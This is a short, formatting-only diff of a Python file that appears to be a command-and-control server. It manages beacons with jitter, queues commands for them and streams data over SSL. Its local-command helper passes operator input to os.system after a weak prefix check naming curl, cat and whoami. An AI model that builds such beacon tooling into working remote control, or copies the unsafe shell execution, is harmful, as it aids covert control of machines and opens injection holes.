@@ -82,7 +82,7 @@ def add_beacon_list(uuid: str, r_address: str, hostname: str,
     beacons["next_beacon"].append(str(last_beacon) + str(timer))
     beacons["timer"].append(timer)
     beacons["jitter"].append(jitter)
-    
+
 
 def add_beacon_command_list(beacon_uuid: str,
                             command: str) -> None:
@@ -93,7 +93,6 @@ def add_beacon_command_list(beacon_uuid: str,
     beacon_commands["command_output"].append("")
     beacon_commands["executed"].append(False)
     print(f"Command {command_uuid} added to beacon {beacon_uuid}")
-
 
 
 def remove_connection_list(r_address: Tuple[str, int]) -> None:
@@ -173,7 +172,8 @@ def send_data_loadingbar(conn: ssl.SSLSocket, data: any) -> None:
     total_length = len(data)
     chunk_size = 4096
     conn.sendall(struct.pack('!II', total_length, chunk_size))
-    for i in tqdm(range(0, total_length, chunk_size), desc="DataSent", colour="#39ff14"):
+    for i in tqdm(range(0, total_length, chunk_size),
+                  desc="DataSent", colour="#39ff14"):
         end_index = min(i + chunk_size, total_length)
         chunk = data[i:end_index]
         try:
@@ -186,7 +186,9 @@ def execute_local_commands(value: str) -> bool:
     """
     Executes local commands on the server side.
     """
-    if value.lower().startswith(("ls", "cat", "pwd", "ping", "curl", "whoami", "\\", "clear")):
+    if value.lower().startswith(
+        ("ls", "cat", "pwd", "ping", "curl", "whoami", "\\", "clear")
+    ):
         if value.startswith("\\"):
             value = value.replace("\\", "")
         os.system(value)
